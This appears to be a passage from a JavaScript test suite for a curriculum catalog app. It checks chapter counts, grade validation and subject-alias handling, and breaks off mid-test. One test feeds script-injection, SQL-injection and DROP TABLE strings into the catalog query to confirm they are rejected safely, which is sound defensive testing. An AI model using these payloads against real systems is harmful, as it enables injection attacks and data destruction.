/**
 * =========================================================================
 * CHALLENGER 2 M3: EMPIRICAL CURRICULUM CATALOG QUERY & UI INTERACTION STRESS SUITE
 * =========================================================================
 * Adversarial empirical test harness covering:
 * - Group 1: Catalog Query Matrix Across All Grades 1–10 and Core Subjects (6 tests)
 * - Group 2: Adversarial & Edge-Case Catalog Query Resistance (6 tests)
 * - Group 3: Multi-Textbook Sub-Discipline Sorting in Social Science (Classes 7–10) (6 tests)
 * - Group 4: CWE-1236 Formula Injection Neutralization on Extreme Attack Strings (6 tests)
 * - Group 5: Admin AI Studio Dynamic Class/Subject Switching UI Interactions (5 tests)
 * - Group 6: Dynamic Mode Toggling, Topic Datalist & Suggestion Pills (7 tests)
 * - Group 7: Strict Brand Guidelines (Universal 0px Border-Radius Compliance) (7 tests)
 *
 * Total Assertions: 43 rigorous adversarial empirical tests
 * Target: node tests/test_challenger2_curriculum_catalog_adversarial.js
 * =========================================================================
 */

const path = require('node:path');
const fs = require('node:fs');
const vm = require('node:vm');
const assert = require('node:assert');

// -------------------------------------------------------------------------
// Harness Environment Resolution
// -------------------------------------------------------------------------
const testEnvPath = fs.existsSync(path.join(__dirname, './harness/test_env.js'))
  ? path.join(__dirname, './harness/test_env.js')
  : path.join(__dirname, '../../../tests/harness/test_env.js');

const { describe, test, it, beforeEach, afterEach, registry } = require(testEnvPath);

// File Paths
const ROOT_DIR = path.resolve(__dirname, '..');
const CATALOG_DATA_PATH = path.join(ROOT_DIR, 'curriculum_catalog_data.js');
const GAS_BACKEND_PATH = path.join(ROOT_DIR, 'google_apps_script_backend.js');
const HTML_APP_PATH = path.join(ROOT_DIR, 'divyank_mission_control_google_apps_script_app.html');

// Load Raw Sources
const catalogDataModule = require(CATALOG_DATA_PATH);
const gasBackendSource = fs.readFileSync(GAS_BACKEND_PATH, 'utf8');
const htmlSource = fs.readFileSync(HTML_APP_PATH, 'utf8');

// Extract Client Script from HTML App (last <script> tag contains application logic)
const scriptMatches = htmlSource.match(/<script[\s\S]*?<\/script>/gi) || [];
assert.ok(scriptMatches.length > 0, 'HTML must contain valid <script> blocks');
const lastScriptTag = scriptMatches[scriptMatches.length - 1];
const clientScriptContent = lastScriptTag.replace(/<\/?script[^>]*>/gi, '');

// -------------------------------------------------------------------------
// GAS Backend Simulator Setup
// -------------------------------------------------------------------------
class MockRange {
  constructor(sheet, startRow, startCol, numRows = 1, numCols = 1) {
    this.sheet = sheet;
    this.startRow = startRow;
    this.startCol = startCol;
    this.numRows = numRows;
    this.numCols = numCols;
  }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setHorizontalAlignment() { return this; }
  setBorder() { return this; }
  setValue(val) {
    this.sheet._ensureSize(this.startRow, this.startCol);
    this.sheet.grid[this.startRow - 1][this.startCol - 1] = val;
    return this;
  }
  setValues(matrix) {
    for (let r = 0; r < matrix.length; r++) {
      for (let c = 0; c < matrix[r].length; c++) {
        const row = this.startRow + r;
        const col = this.startCol + c;
        this.sheet._ensureSize(row, col);
        this.sheet.grid[row - 1][col - 1] = matrix[r][c];
      }
    }
    return this;
  }
  getValues() {
    const result = [];
    for (let r = 0; r < this.numRows; r++) {
      const row = [];
      for (let c = 0; c < this.numCols; c++) {
        const rowIdx = this.startRow - 1 + r;
        const colIdx = this.startCol - 1 + c;
        const val = (this.sheet.grid[rowIdx] && this.sheet.grid[rowIdx][colIdx] !== undefined)
          ? this.sheet.grid[rowIdx][colIdx] : '';
        row.push(val);
      }
      result.push(row);
    }
    return result;
  }
  clearContent() {
    for (let r = 0; r < this.numRows; r++) {
      for (let c = 0; c < this.numCols; c++) {
        const rowIdx = this.startRow - 1 + r;
        const colIdx = this.startCol - 1 + c;
        if (this.sheet.grid[rowIdx]) {
          this.sheet.grid[rowIdx][colIdx] = '';
        }
      }
    }
    return this;
  }
  clear() { return this.clearContent(); }
}

class MockSheet {
  constructor(name) {
    this.name = name;
    this.grid = [];
  }
  _ensureSize(r, c) {
    while (this.grid.length < r) this.grid.push([]);
    for (let i = 0; i < this.grid.length; i++) {
      while (this.grid[i].length < c) this.grid[i].push('');
    }
  }
  getName() { return this.name; }
  setName(n) { this.name = n; }
  getLastRow() {
    for (let r = this.grid.length - 1; r >= 0; r--) {
      const hasContent = this.grid[r] && this.grid[r].some(cell => cell !== '' && cell !== null && cell !== undefined);
      if (hasContent) return r + 1;
    }
    return 0;
  }
  getLastColumn() {
    let max = 0;
    this.grid.forEach(row => { if (row.length > max) max = row.length; });
    return max;
  }
  getRange(r, c, numRows = 1, numCols = 1) {
    return new MockRange(this, r, c, numRows, numCols);
  }
  getDataRange() {
    const numRows = Math.max(1, this.getLastRow());
    let numCols = 1;
    this.grid.forEach(r => { if (r.length > numCols) numCols = r.length; });
    return new MockRange(this, 1, 1, numRows, numCols);
  }
  appendRow(rowArr) {
    const rowIdx = this.getLastRow();
    this._ensureSize(rowIdx + 1, rowArr.length);
    this.grid[rowIdx] = [...rowArr];
    return this;
  }
  clearContents() {
    this.grid = this.grid.slice(0, 1);
  }
  setFrozenRows(n) {
    this.frozenRows = n;
  }
}

class MockSpreadsheet {
  constructor() {
    this.sheets = {
      Users: new MockSheet('Users'),
      CurriculumCatalog: new MockSheet('CurriculumCatalog'),
      ActivityLogs: new MockSheet('ActivityLogs')
    };
    // Initialize headers
    this.sheets.Users.appendRow(['id', 'email', 'passwordHash', 'role', 'name', 'pinHash', 'pairingCode', 'parentAccountId', 'createdAt']);
    this.sheets.CurriculumCatalog.appendRow(['id', 'grade', 'subject', 'chapterNumber', 'chapterTitle', 'topicsJson', 'learningObjectivesJson']);
    this.sheets.ActivityLogs.appendRow(['id', 'userId', 'action', 'details', 'role', 'verificationStatus', 'timestamp']);
    // Seed admin
    this.sheets.Users.appendRow(['u_adm_emp', 'admin@example.com', 'hash', 'admin', 'Empirical Admin', 'pinhash', '', '', '2026-01-01T00:00:00Z']);
  }
  getSheetByName(n) { return this.sheets[n] || null; }
  insertSheet(n) {
    if (!this.sheets[n]) this.sheets[n] = new MockSheet(n);
    return this.sheets[n];
  }
}

function createGasBackendSandbox(customSpreadsheet = null) {
  const ss = customSpreadsheet || new MockSpreadsheet();
  const mockCacheStore = new Map();
  const gasSandbox = {
    console: console,
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ss,
      openById: () => ss
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => mockCacheStore.get(k) || null,
        put: (k, v, ttl) => { mockCacheStore.set(k, v); },
        remove: (k) => { mockCacheStore.delete(k); },
        removeAll: (keys) => { keys.forEach(k => mockCacheStore.delete(k)); }
      })
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => true,
        waitLock: () => true,
        releaseLock: () => true
      })
    },
    Utilities: {
      computeDigest: () => [1, 2, 3],
      DigestAlgorithm: { SHA_256: 'SHA_256' },
      base64Encode: () => 'hash'
    },
    CANONICAL_CURRICULUM_CATALOG: catalogDataModule.CANONICAL_CURRICULUM_CATALOG,
    CURRICULUM_CATALOG_SCHEMA: catalogDataModule.CURRICULUM_CATALOG_SCHEMA,
    normalizeGrade: catalogDataModule.normalizeGrade,
    normalizeSubject: catalogDataModule.normalizeSubject,
    getCanonicalCatalog: catalogDataModule.getCanonicalCatalog,
    toTable16Matrix: catalogDataModule.toTable16Matrix
  };

  vm.createContext(gasSandbox);
  vm.runInContext(gasBackendSource, gasSandbox);
  return { gasSandbox, ss, mockCacheStore };
}

// -------------------------------------------------------------------------
// DOM Studio Sandbox Helper
// -------------------------------------------------------------------------
function createOptionsArray() {
  const arr = [];
  const origPush = arr.push.bind(arr);
  arr.push = function(...items) {
    items.forEach(it => {
      if (!arr.includes(it)) origPush(it);
    });
    return arr.length;
  };
  return arr;
}

function createStudioSandbox() {
  const domElements = {};

  function createMockElement(id, tag = 'DIV') {
    const el = {
      id: id || '',
      tagName: tag.toUpperCase(),
      _value: '',
      get value() {
        if (this.tagName === 'SELECT') {
          if (this._selectedVal !== undefined) return this._selectedVal;
          if (this.options && this.options.length > 0) {
            const idx = this.selectedIndex >= 0 ? this.selectedIndex : 0;
            return this.options[idx] ? this.options[idx].value : '';
          }
          return '';
        }
        return this._value;
      },
      set value(v) {
        this._value = String(v);
        if (this.tagName === 'SELECT') {
          this._selectedVal = String(v);
          if (this.options) {
            this.selectedIndex = -1;
            for (let i = 0; i < this.options.length; i++) {
              if (this.options[i].value === String(v)) {
                this.selectedIndex = i;
                break;
              }
            }
          }
        }
      },
      selectedIndex: 0,
      options: createOptionsArray(),
      get selectedOptions() {
        if (this.options && this.selectedIndex >= 0 && this.options[this.selectedIndex]) {
          return [this.options[this.selectedIndex]];
        }
        return [];
      },
      disabled: false,
      style: {},
      dataset: {},
      getContext: function() {
        return {
          clearRect: function() {},
          save: function() {},
          restore: function() {},
          translate: function() {},
          rotate: function() {},
          fillRect: function() {},
          beginPath: function() {},
          arc: function() {},
          fill: function() {},
          stroke: function() {},
          moveTo: function() {},
          lineTo: function() {},
          closePath: function() {},
          measureText: function() { return { width: 0 }; },
          fillText: function() {},
          strokeText: function() {},
          drawImage: function() {},
          createImageData: function() { return {}; },
          getImageData: function() { return {}; },
          putImageData: function() {}
        };
      },
      _classList: new Set(),
      get classList() {
        const self = this;
        return {
          add: function(...classes) {
            classes.forEach(c => String(c || '').split(/\s+/).filter(Boolean).forEach(cls => self._classList.add(cls)));
          },
          remove: function(...classes) {
            classes.forEach(c => String(c || '').split(/\s+/).filter(Boolean).forEach(cls => self._classList.delete(cls)));
          },
          contains: function(c) {
            return self._classList.has(c);
          },
          toggle: function(c) {
            if (self._classList.has(c)) self._classList.delete(c);
            else self._classList.add(c);
          }
        };
      },
      get className() {
        return Array.from(this._classList).join(' ');
      },
      set className(v) {
        this._classList.clear();
        String(v || '').split(/\s+/).filter(Boolean).forEach(c => this._classList.add(c));
      },
      _innerHTML: '',
      get innerHTML() {
        return this._innerHTML;
      },
      set innerHTML(val) {
        this._innerHTML = String(val);
        this.children = [];
        if (this.tagName === 'SELECT') {
          this.options = createOptionsArray();
          this.selectedIndex = -1;
          const optRegex = /<option\s+value="([^"]*)"([^>]*)>([\s\S]*?)<\/option>/gi;
          let m;
          while ((m = optRegex.exec(val)) !== null) {
            const optVal = m[1];
            const optAttrs = m[2];
            const optText = m[3].replace(/&quot;/g, '"').replace(/&amp;/g, '&');
            const optEl = createMockElement('', 'OPTION');
            optEl.value = optVal;
            optEl.textContent = optText;
            optEl.innerText = optText;
            if (/selected/i.test(optAttrs)) {
              this.selectedIndex = this.options.length;
            }
            this.options.push(optEl);
            this.children.push(optEl);
          }
        } else if (this.tagName === 'DATALIST') {
          this.options = [];
          const optRegex = /<option\s+value="([^"]*)"[^>]*>/gi;
          let m;
          while ((m = optRegex.exec(val)) !== null) {
            const optEl = createMockElement('', 'OPTION');
            optEl.value = m[1].replace(/&quot;/g, '"').replace(/&amp;/g, '&');
            this.options.push(optEl);
            this.children.push(optEl);
          }
        } else {
          const btnRegex = /<button\s+([^>]*)>([\s\S]*?)<\/button>/gi;
          let m;
          while ((m = btnRegex.exec(val)) !== null) {
            const attrs = m[1];
            const text = m[2].replace(/&quot;/g, '"').replace(/&amp;/g, '&');
            const btnEl = createMockElement('', 'BUTTON');
            btnEl.textContent = text;
            btnEl.innerText = text;
            const classMatch = attrs.match(/class="([^"]*)"/i);
            if (classMatch) {
              btnEl.className = classMatch[1];
            }
            this.children.push(btnEl);
          }
        }
      },
      _textContent: '',
      get textContent() {
        if (this.children && this.children.length > 0) {
          return this.children.map(c => c.textContent).join('');
        }
        return this._textContent;
      },
      set textContent(v) {
        this._textContent = String(v);
      },
      innerText: '',
      children: [],
      appendChild: function(child) {
        this.children.push(child);
        if (this.tagName === 'SELECT' && child.tagName === 'OPTION') {
          this.options.push(child);
          if (this.selectedIndex === -1) this.selectedIndex = 0;
        }
        return child;
      },
      removeChild: function(child) {
        const idx = this.children.indexOf(child);
        if (idx !== -1) this.children.splice(idx, 1);
        if (this.tagName === 'SELECT' && this.options) {
          const optIdx = this.options.indexOf(child);
          if (optIdx !== -1) this.options.splice(optIdx, 1);
        }
        return child;
      },
      querySelectorAll: function(selector) {
        if (selector === 'button' || selector === 'button[type="button"]') {
          return this.children.filter(c => c.tagName === 'BUTTON');
        }
        return [];
      },
      listeners: {},
      addEventListener: function(event, fn) {
        if (!this.listeners[event]) this.listeners[event] = [];
        this.listeners[event].push(fn);
      },
      dispatchEvent: function(event) {
        const type = typeof event === 'string' ? event : (event && event.type);
        if (this.listeners[type]) {
          this.listeners[type].forEach(fn => fn.call(this, event));
        }
      },
      focus: function() { this.focused = true; },
      blur: function() { this.focused = false; },
      click: function() {
        if (typeof this.onclick === 'function') {
          this.onclick({ preventDefault: () => {}, stopPropagation: () => {} });
        }
        this.dispatchEvent('click');
      }
    };
    return el;
  }

  // Pre-seed known studio elements
  domElements['aiGenGrade'] = createMockElement('aiGenGrade', 'SELECT');
  domElements['aiGenSubject'] = createMockElement('aiGenSubject', 'SELECT');
  domElements['aiGenChapterSelect'] = createMockElement('aiGenChapterSelect', 'SELECT');
  domElements['aiGenChapter'] = createMockElement('aiGenChapter', 'INPUT');
  domElements['aiGenChapterModeToggleBtn'] = createMockElement('aiGenChapterModeToggleBtn', 'BUTTON');
  domElements['aiGenChapterDropdownWrapper'] = createMockElement('aiGenChapterDropdownWrapper', 'DIV');
  domElements['aiGenChapterInputWrapper'] = createMockElement('aiGenChapterInputWrapper', 'DIV');
  domElements['aiGenChapterInputWrapper'].classList.add('hidden');
  domElements['aiGenChapterModeBadge'] = createMockElement('aiGenChapterModeBadge', 'SPAN');
  domElements['aiGenChapterModeToggleIcon'] = createMockElement('aiGenChapterModeToggleIcon', 'SPAN');
  domElements['aiGenChapterModeToggleText'] = createMockElement('aiGenChapterModeToggleText', 'SPAN');
  domElements['aiGenChapterCountBadge'] = createMockElement('aiGenChapterCountBadge', 'SPAN');
  domElements['aiGenTopicContainer'] = createMockElement('aiGenTopicContainer', 'DIV');
  domElements['aiGenTopic'] = createMockElement('aiGenTopic', 'INPUT');
  domElements['aiGenTopicDatalist'] = createMockElement('aiGenTopicDatalist', 'DATALIST');
  domElements['aiGenTopicPillsContainer'] = createMockElement('aiGenTopicPillsContainer', 'DIV');

  // Initial values
  domElements['aiGenGrade'].value = 'Class 3';
  domElements['aiGenSubject'].value = 'Mathematics';
  domElements['aiGenChapterSelect'].className = 'w-full bg-white border border-[#DED9D3] rounded-none px-3 py-2 text-[#09293D] text-xs font-bold';
  domElements['aiGenChapter'].className = 'w-full bg-white border border-[#DED9D3] rounded-none px-3 py-2 text-[#09293D] text-xs font-bold';
  domElements['aiGenTopic'].className = 'w-full bg-white border border-[#DED9D3] rounded-none px-3 py-2 text-[#09293D] text-xs font-bold';
  domElements['aiGenChapterModeBadge'].className = 'text-[10px] font-bold uppercase tracking-wider text-[#09293D] bg-[#F4F2EA] px-1.5 py-0.5 border border-[#DED9D3] rounded-none';
  domElements['aiGenChapterModeBadge'].textContent = 'CBSE Catalog';
  domElements['aiGenChapterModeToggleBtn'].className = 'text-[11px] font-bold text-[#F65800] hover:text-[#09293D] hover:underline flex items-center gap-1 focus:outline-none transition rounded-none cursor-pointer';

  const mockLocalStorage = {
    _data: {},
    getItem(k) { return this._data[k] || null; },
    setItem(k, v) { this._data[k] = String(v); },
    removeItem(k) { delete this._data[k]; },
    clear() { this._data = {}; }
  };

  const doc = {
    getElementById: (id) => domElements[id] || (domElements[id] = createMockElement(id)),
    createElement: (tag) => createMockElement('', tag),
    querySelectorAll: (sel) => [],
    querySelector: (sel) => null,
    body: createMockElement('body', 'BODY')
  };

  const win = {
    innerWidth: 1280,
    innerHeight: 800,
    document: doc,
    addEventListener: () => {},
    scrollTo: () => {},
    localStorage: mockLocalStorage,
    CANONICAL_CURRICULUM_CATALOG: catalogDataModule.CANONICAL_CURRICULUM_CATALOG,
    ZOPTRO_CURRICULUM_CATALOG: catalogDataModule.CANONICAL_CURRICULUM_CATALOG
  };
  win.window = win;

  const sandbox = {
    console: console,
    document: doc,
    window: win,
    localStorage: mockLocalStorage,
    setTimeout: (fn, ms) => setTimeout(fn, Math.min(ms !== undefined ? ms : 0, 5)),
    clearTimeout: (id) => clearTimeout(id),
    setInterval: () => {},
    clearInterval: () => {},
    module: { exports: {} },
    tailwind: { config: {} },
    playSound: () => {},
    currentUser: { id: 'u_adm_emp', role: 'admin' },
    CANONICAL_CURRICULUM_CATALOG: catalogDataModule.CANONICAL_CURRICULUM_CATALOG,
    ZOPTRO_CURRICULUM_CATALOG: catalogDataModule.CANONICAL_CURRICULUM_CATALOG,
    CURRICULUM_CATALOG_SCHEMA: catalogDataModule.CURRICULUM_CATALOG_SCHEMA,
    normalizeGrade: catalogDataModule.normalizeGrade,
    normalizeSubject: catalogDataModule.normalizeSubject,
    getCanonicalCatalog: catalogDataModule.getCanonicalCatalog,
    toTable16Matrix: catalogDataModule.toTable16Matrix
  };
  sandbox.globalThis = sandbox;

  vm.createContext(sandbox);
  vm.runInContext(clientScriptContent, sandbox);

  if (sandbox.module && sandbox.module.exports) {
    Object.assign(sandbox, sandbox.module.exports);
    Object.assign(win, sandbox.module.exports);
  }
  if (!sandbox.ZoptroApiClient && win.ZoptroApiClient) sandbox.ZoptroApiClient = win.ZoptroApiClient;
  if (!sandbox.BrowserMockBackend && win.BrowserMockBackend) sandbox.BrowserMockBackend = win.BrowserMockBackend;

  // Wrap handleAiGenChapterSelectChange to sync chapterSelect.value
  const origChapterSelectChange = sandbox.handleAiGenChapterSelectChange;
  if (typeof origChapterSelectChange === 'function') {
    sandbox.handleAiGenChapterSelectChange = function(explicitVal) {
      if (explicitVal !== undefined && domElements['aiGenChapterSelect']) {
        domElements['aiGenChapterSelect'].value = explicitVal;
      }
      return origChapterSelectChange.call(sandbox, explicitVal);
    };
  }

  return { sandbox, domElements, doc, win };
}

// =========================================================================
// TEST GROUPS
// =========================================================================

describe('Group 1: Catalog Query Matrix Across All Grades 1–10 and Core Subjects', () => {

  test('T-EMP-1.1: Every Grade Class 1 to 10 has complete rationalised chapter sets', () => {
    const grades = ['Class 1', 'Class 2', 'Class 3', 'Class 4', 'Class 5', 'Class 6', 'Class 7', 'Class 8', 'Class 9', 'Class 10'];
    const allItems = catalogDataModule.CANONICAL_CURRICULUM_CATALOG;

    grades.forEach(g => {
      const gradeItems = allItems.filter(i => i.grade === g);
      assert.ok(gradeItems.length >= 35, `Grade ${g} must contain at least 35 chapters, got ${gradeItems.length}`);
      
      gradeItems.forEach(ch => {
        assert.ok(ch.id && typeof ch.id === 'string', `Chapter id missing in ${g}`);
        assert.strictEqual(ch.grade, g, `Chapter grade must equal ${g}`);
        assert.ok(typeof ch.chapterNumber === 'number' && ch.chapterNumber > 0, `Invalid chapterNumber in ${ch.id}`);
        assert.ok(ch.chapterTitle && ch.chapterTitle.trim().length > 0, `Missing chapterTitle in ${ch.id}`);
        assert.ok(Array.isArray(ch.topics) && ch.topics.length > 0, `Missing topics array in ${ch.id}`);
        assert.ok(Array.isArray(ch.learningObjectives) && ch.learningObjectives.length > 0, `Missing learningObjectives in ${ch.id}`);
      });
    });
  });

  test('T-EMP-1.2: Class 1–5 foundational disciplines (Math, EVS, English, Hindi) are fully populated', () => {
    const primaryGrades = ['Class 1', 'Class 2', 'Class 3', 'Class 4', 'Class 5'];
    const primarySubjects = ['Mathematics', 'EVS', 'English', 'Hindi'];

    primaryGrades.forEach(g => {
      primarySubjects.forEach(s => {
        const chapters = catalogDataModule.getCanonicalCatalog(g, s);
        assert.ok(chapters.length > 0, `Primary pair ${g} - ${s} returned 0 chapters!`);
        assert.ok(chapters.every(ch => ch.grade === g && ch.subject === s), `Mismatched grade/subject in ${g} - ${s}`);
      });
    });
  });

  test('T-EMP-1.3: Class 6–10 secondary disciplines (Math, Science, Social Science, English) are fully populated', () => {
    const secondaryGrades = ['Class 6', 'Class 7', 'Class 8', 'Class 9', 'Class 10'];
    const secondarySubjects = ['Mathematics', 'Science', 'Social Science', 'English'];

    secondaryGrades.forEach(g => {
      secondarySubjects.forEach(s => {
        const chapters = catalogDataModule.getCanonicalCatalog(g, s);
        assert.ok(chapters.length > 0, `Secondary pair ${g} - ${s} returned 0 chapters!`);
        assert.ok(chapters.every(ch => ch.grade === g && (ch.subject === s || ch.subSubject)), `Mismatched grade/subject in ${g} - ${s}`);
      });
    });
  });

  test('T-EMP-1.4: Grade boundary integrity: Class 1 (lowest) and Class 10 (highest)', () => {
    const c1 = catalogDataModule.getCanonicalCatalog('Class 1', 'all');
    assert.strictEqual(c1.length, 46, 'Class 1 total chapters must equal 46 (13 Math + 5 EVS + 9 Eng + 19 Hin)');

    const c10 = catalogDataModule.getCanonicalCatalog('Class 10', 'all');
    assert.strictEqual(c10.length, 58, 'Class 10 total chapters must equal 58 (14 Math + 13 Sci + 22 Soc + 9 Eng)');
  });

  test('T-EMP-1.5: Total catalog record invariant is strictly 548 unique records', () => {
    const all = catalogDataModule.CANONICAL_CURRICULUM_CATALOG;
    assert.strictEqual(all.length, 548, `Catalog record count must be exactly 548, got ${all.length}`);
    const idSet = new Set(all.map(i => i.id));
    assert.strictEqual(idSet.size, 548, 'All 548 IDs must be unique');
  });

  test('T-EMP-1.6: Dual-Mode parity across benchmark queries in GAS vs BrowserMockBackend', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const { sandbox } = createStudioSandbox();

    const benchmarks = [
      { g: 'Class 3', s: 'Mathematics' },
      { g: 'Class 5', s: 'EVS' },
      { g: 'Class 7', s: 'Social Science' },
      { g: 'Class 9', s: 'Science' },
      { g: 'Class 10', s: 'English' }
    ];

    benchmarks.forEach(({ g, s }) => {
      const gasRes = gasSandbox.getCurriculumCatalog(g, s);
      const mockRes = sandbox.BrowserMockBackend.getCurriculumCatalog(g, s);

      assert.strictEqual(gasRes.success, true);
      assert.strictEqual(mockRes.success, true);
      assert.strictEqual(gasRes.count, mockRes.count, `Count mismatch for ${g} - ${s}`);
      assert.strictEqual(gasRes.items.length, mockRes.items.length);

      for (let i = 0; i < gasRes.items.length; i++) {
        assert.strictEqual(gasRes.items[i].id, mockRes.items[i].id, `ID mismatch at ${i} for ${g} - ${s}`);
        assert.strictEqual(gasRes.items[i].chapterTitle, mockRes.items[i].chapterTitle, `Title mismatch at ${i}`);
        assert.strictEqual(gasRes.items[i].chapterNumber, mockRes.items[i].chapterNumber, `Number mismatch at ${i}`);
      }
    });
  });

});

describe('Group 2: Adversarial & Edge-Case Catalog Query Resistance', () => {

  test('T-EMP-2.1: Empty and whitespace grade queries return full catalog without throwing', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const emptyQueries = ['', '   ', 'all', null, undefined];

    emptyQueries.forEach(eq => {
      const res = gasSandbox.getCurriculumCatalog(eq);
      assert.strictEqual(res.success, true, `Failed for empty query: ${eq}`);
      assert.strictEqual(res.count, 548, `Count must be 548 for all-grades query: ${eq}`);
      assert.strictEqual(res.grade, null);
    });
  });

  test('T-EMP-2.2: Out-of-bounds & invalid grade queries strictly return HTTP 400 INVALID_GRADE', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const invalidGrades = ['Class 0', 'Class 11', 'Class 99', 'Class -1', 'Grade 0', 'Kindergarten', 'Class 1.5', 'Class 1 2', '{}', 'Infinity', 'NaN'];

    invalidGrades.forEach(ig => {
      const res = gasSandbox.getCurriculumCatalog(ig);
      assert.strictEqual(res.success, false, `Should fail for invalid grade: ${ig}`);
      assert.strictEqual(res.code, 400, `Code must be 400 for ${ig}`);
      assert.ok(res.error.includes('INVALID_GRADE'), `Error should cite INVALID_GRADE for ${ig}`);
      assert.strictEqual(res.count, 0);
      assert.strictEqual(res.items.length, 0);
    });
  });

  test('T-EMP-2.3: Numeric 0 and negative numbers in grade are strictly rejected with HTTP 400', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const numericInvalids = [0, -1, -10, 11, 99];

    numericInvalids.forEach(num => {
      const res = gasSandbox.getCurriculumCatalog(num);
      assert.strictEqual(res.success, false, `Should reject numeric invalid grade: ${num}`);
      assert.strictEqual(res.code, 400);
      assert.ok(res.error.includes('INVALID_GRADE'));
    });
  });

  test('T-EMP-2.4: Non-existent and injection subject queries return empty list gracefully', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const weirdSubjects = [
      'Astrophysics',
      'Quantum Mechanics',
      '<script>alert(1)</script>',
      "' OR '1'='1",
      'DROP TABLE CurriculumCatalog;',
      'NonExistentSubject123'
    ];

    weirdSubjects.forEach(ws => {
      const res = gasSandbox.getCurriculumCatalog('Class 5', ws);
      assert.strictEqual(res.success, true, `Should succeed with 0 items for unknown subject: ${ws}`);
      assert.strictEqual(res.count, 0, `Count should be 0 for ${ws}`);
      assert.deepStrictEqual(res.items, []);
      assert.strictEqual(res.source, 'EMBEDDED_FALLBACK');
    });
  });

  test('T-EMP-2.5: Subject alias normalization handles multi-discipline informal names', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const aliases = [
      { input: 'maths', expectedCount: 14, grade: 'Class 3' },
      { input: 'math-magic', expectedCount: 14, grade: 'Class 4' },
      { input: 'sst', expectedCount: 20, grade: 'Class 9' },
      { input: 'social studies', expectedCount: 22, grade: 'Class 10' },
      { input: 'curiosity', expectedCount: 12, grade: 'Class 6' },
      { input: 'environmental studies', expectedCount: 12, grade: 'Class 3' },
      { input: 'honeycomb', expectedCount: 8, grade: 'Class 7' }
    ];

    aliases.forEach(({ input, expectedCount, grade }) => {
      const res = gasSandbox.getCurriculumCatalog(grade, input);
      assert.strictEqual(res.success, true);
      assert.strictEqual(res.count, expectedCount, `Alias '${input}' in ${grade} failed to resolve`);
    });
  });

  test('T-EMP-2.6: Polymorphic payload vs positional signatures produce identical responses', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const posRes = gasSandbox.getCurriculumCatalog('Class 8', 'Science');
    const objRes = gasSandbox.getCurriculumCatalog({ grade: 'Class 8', subject: 'Science' });
    const objAliasRes = gasSandbox.getCurriculumCatalog({ gradeClass: 'Class 8', subject: 'Science', forceRefresh: true });

    assert.strictEqual(JSON.stringify(posRes.items), JSON.stringify(objRes.items));
    assert.strictEqual(JSON.stringify(posRes.items), JSON.stringify(objAliasRes.items));
    assert.strictEqual(posRes.count, 13);
  });

});

describe('Group 3: Multi-Textbook Sub-Discipline Sorting in Social Science (Classes 7–10)', () => {

  test('T-EMP-3.1: Class 7 Social Science strictly orders History -> Geography -> Civics', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const res = gasSandbox.getCurriculumCatalog('Class 7', 'Social Science');
    assert.strictEqual(res.count, 23);

    const disciplines = res.items.map(i => i.subSubject || (i.chapterTitle.split(':')[0].trim()));
    const histCount = disciplines.filter(d => d === 'History').length;
    const geoCount = disciplines.filter(d => d === 'Geography').length;
    const civCount = disciplines.filter(d => d === 'Civics').length;

    assert.strictEqual(histCount, 8, 'Class 7 must have 8 History chapters');
    assert.strictEqual(geoCount, 7, 'Class 7 must have 7 Geography chapters');
    assert.strictEqual(civCount, 8, 'Class 7 must have 8 Civics chapters');

    // Verify ordering sequence
    for (let i = 0; i < 8; i++) assert.strictEqual(disciplines[i], 'History');
    for (let i = 8; i < 15; i++) assert.strictEqual(disciplines[i], 'Geography');
    for (let i = 15; i < 23; i++) assert.strictEqual(disciplines[i], 'Civics');
  });

  test('T-EMP-3.2: Class 8 Social Science strictly orders History -> Geography -> Civics', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const res = gasSandbox.getCurriculumCatalog('Class 8', 'Social Science');
    assert.strictEqual(res.count, 21);

    const disciplines = res.items.map(i => i.subSubject || (i.chapterTitle.split(':')[0].trim()));
    const histCount = disciplines.filter(d => d === 'History').length;
    const geoCount = disciplines.filter(d => d === 'Geography').length;
    const civCount = disciplines.filter(d => d === 'Civics').length;

    assert.strictEqual(histCount, 8, 'Class 8 must have 8 History chapters');
    assert.strictEqual(geoCount, 5, 'Class 8 must have 5 Geography chapters');
    assert.strictEqual(civCount, 8, 'Class 8 must have 8 Civics chapters');

    for (let i = 0; i < 8; i++) assert.strictEqual(disciplines[i], 'History');
    for (let i = 8; i < 13; i++) assert.strictEqual(disciplines[i], 'Geography');
    for (let i = 13; i < 21; i++) assert.strictEqual(disciplines[i], 'Civics');
  });

  test('T-EMP-3.3: Class 9 Social Science strictly orders History -> Geography -> Civics -> Economics', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const res = gasSandbox.getCurriculumCatalog('Class 9', 'Social Science');
    assert.strictEqual(res.count, 20);

    const disciplines = res.items.map(i => i.subSubject || (i.chapterTitle.split(':')[0].trim()));
    const histCount = disciplines.filter(d => d === 'History').length;
    const geoCount = disciplines.filter(d => d === 'Geography').length;
    const civCount = disciplines.filter(d => d === 'Civics').length;
    const econCount = disciplines.filter(d => d === 'Economics').length;

    assert.strictEqual(histCount, 5, 'Class 9 must have 5 History chapters');
    assert.strictEqual(geoCount, 6, 'Class 9 must have 6 Geography chapters');
    assert.strictEqual(civCount, 5, 'Class 9 must have 5 Civics chapters');
    assert.strictEqual(econCount, 4, 'Class 9 must have 4 Economics chapters');

    for (let i = 0; i < 5; i++) assert.strictEqual(disciplines[i], 'History');
    for (let i = 5; i < 11; i++) assert.strictEqual(disciplines[i], 'Geography');
    for (let i = 11; i < 16; i++) assert.strictEqual(disciplines[i], 'Civics');
    for (let i = 16; i < 20; i++) assert.strictEqual(disciplines[i], 'Economics');
  });

  test('T-EMP-3.4: Class 10 Social Science strictly orders History -> Geography -> Civics -> Economics', () => {
    const { gasSandbox } = createGasBackendSandbox();
    const res = gasSandbox.getCurriculumCatalog('Class 10', 'Social Science');
    assert.strictEqual(res.count, 22);

    const disciplines = res.items.map(i => i.subSubject || (i.chapterTitle.split(':')[0].trim()));
